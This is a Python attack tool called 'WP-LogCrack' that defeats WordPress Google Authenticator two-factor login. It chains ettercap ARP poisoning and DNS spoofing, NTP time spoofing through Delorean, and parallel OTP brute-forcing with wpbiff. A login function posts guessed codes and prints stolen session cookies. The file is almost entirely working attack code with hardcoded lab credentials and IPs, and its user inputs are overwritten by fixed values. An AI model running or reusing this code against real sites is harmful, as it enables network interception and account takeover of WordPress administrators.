#!/usr/bin/python
import multiprocessing
import shlex
import subprocess
from multiprocessing import Pool

import typer
from requests import Session
from rich.console import Console
import pexpect
from datetime import datetime
from termcolor import colored
from pyfiglet import Figlet

console = Console()
app = typer.Typer()
session = Session()


def banner():
    f = Figlet(font='standard')
    print(colored(f.renderText('WP-LogCrack'), 'green', attrs=["bold"]))


def login(server, username, password, code):
    headers = {'User-Agent': "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0"}
    data = {
        "log": username,
        "pwd": password,
        "googleotp": str(code).zfill(6),
        'rememberme': 'forever'
    }
    response = session.post(f"{server}", headers=headers, data=data, allow_redirects=False, verify=False)
    if response.status_code == 302:
        result = {
            'token': code,
            'cookies': response.cookies.get_dict()
        }
        print(result)
        return True
    return False


def bruteforce(server, username, password, start, end, event):
    while event.is_set():
        for code in range(start, end):
            print("code " + str(code))
            result = login(server, username, password, code)
            if result:
                event.clear()  # Stop running.
                break


def get_timestamp():
    data = datetime.today()
    minute = data.minute
    minute = (minute + 2) % 60
    if minute < 10:
        minute = "0" + str(minute)
    timestamp = data.strftime('%Y-%m-%d %H:' + str(minute))

    return timestamp


def ettercap(timestamp, server, username, password):
    ip = input("Victim IP: ")
    ip = "192.168.43.210"
    cmd = "sudo ettercap -T -M arp /" + ip + "// -P dns_spoof"
    print("Ettercap Starting")
    p = pexpect.spawn(cmd, timeout=None)

    if not p.eof():
        print("Ettercap Started")

    while not p.eof():
        str_line = str(p.readline())
        if "UDP  " + ip + ":" in str_line:
            print(str_line)
            delorean(timestamp, server, username, password)


def delorean(timestamp, server, username, password):
    print("Delorean Starting...")
    cmd = "python3 Delorean-master/delorean.py -d \"" + timestamp + "\""
    p = pexpect.spawn(cmd, timeout=None)

    if not p.eof():
        print("Delorean Started")

    while not p.eof():
        str_line = str(p.readline())
        if "OSError: [Errno 98] Address already in use" in str_line:
            print("Error: Delorean already started elsewhere")

        if "Sent to" in str_line:
            print(str_line)
            hour = (str_line[len(str_line) - 10: len(str_line) - 8])
            time = datetime.strptime(timestamp, '%Y-%m-%d %H:%M')
            time = time.replace(hour=int(hour))
            time = str(time.strftime('%Y-%m-%d %H:%M'))
            wpbiff(time, server, username, password)


def wpbiff(timestamp, server, username, password):
    '''
    processes = []
    manager = multiprocessing.Manager()
    event = manager.Event()
    event.set()
    process1 = multiprocessing.Process(target=bruteforce, args=(server, username, password, 0, 333333, event))
    process2 = multiprocessing.Process(target=bruteforce, args=(server, username, password, 214300, 666666, event))
    process3 = multiprocessing.Process(target=bruteforce, args=(server, username, password, 553200, 999999, event))

    processes.append(process1)
    processes.append(process2)
    processes.append(process3)
    process1.start()
    process2.start()
    process3.start()

    for process in processes:
        process.join()
    '''

    command_wp_biff1 = "sudo wpbiff -t 000000 -m 333333 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
    command_wp_biff2 = "sudo wpbiff -t 333331 -m 666666 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
    command_wp_biff3 = "sudo wpbiff -t 666661 -m 999999 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""

    p1 = subprocess.Popen(shlex.split(command_wp_biff1), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p2 = subprocess.Popen(shlex.split(command_wp_biff2), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p3 = subprocess.Popen(shlex.split(command_wp_biff3), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    with console.status("Discovering Token..."):
        while True:
            output1 = p1.stderr.read1().strip().decode("utf8")
            output2 = p2.stderr.read1().strip().decode("utf8")
            output3 = p3.stderr.read1().strip().decode("utf8")

            if (output1 == '' and p1.poll() is not None) and \
                    (output2 == '' and p2.poll() is not None) and \
                    (output3 == '' and p3.poll() is not None) :
                break

            if output1:
                print(output1)
                if "100%" in output1:
                    print(p1.stdout.read().strip().decode("utf8").split("Great Success!")[1])
                    break
            if output2:
                print(output2)
                if "100%" in output2:
                    print(p2.stdout.read().strip().decode("utf8").split("Great Success!")[1])
                    break
            if output3:
                print(output3)
                if "100%" in output3:
                    print(p3.stdout.read().strip().decode("utf8").split("Great Success!")[1])
                    break

    p1.poll()
    p2.poll()
    p3.poll()


@app.callback()
def main(
        server: str = typer.Option(
            ...,
            prompt=True,
            envvar="SERVER",
            help=f"Vulnerable Wordpress server link"
        ),
        username: str = typer.Option(
            ...,
            prompt=True,
            help=f"WordPress username"
        ),
        password: str = typer.Option(
            ...,
            prompt=True,
            help=f"WordPress password"
        ),
        dns_spoof: bool = typer.Option(
            default=True,
            prompt=True,
            help=f"DNS spoofing attack"
        )):

    banner()
    server = "http://192.168.43.210/wordpress/wp-login.php"
    username = "admin"
    password = "ubuntu"
    with console.status("Getting timestamp to use for the Attack"):
        timestamp = get_timestamp()
        print("The timestamp chosen for the attack is: " + timestamp)

    if dns_spoof:
        ettercap(timestamp, server, username, password)
    else:
        delorean(timestamp, server, username, password)


def run():
    try:
        typer.run(main)
    except Exception as e:
        console.print(f"[red bold]Error:[/red bold] {e}")


if __name__ == "__main__":
    run()
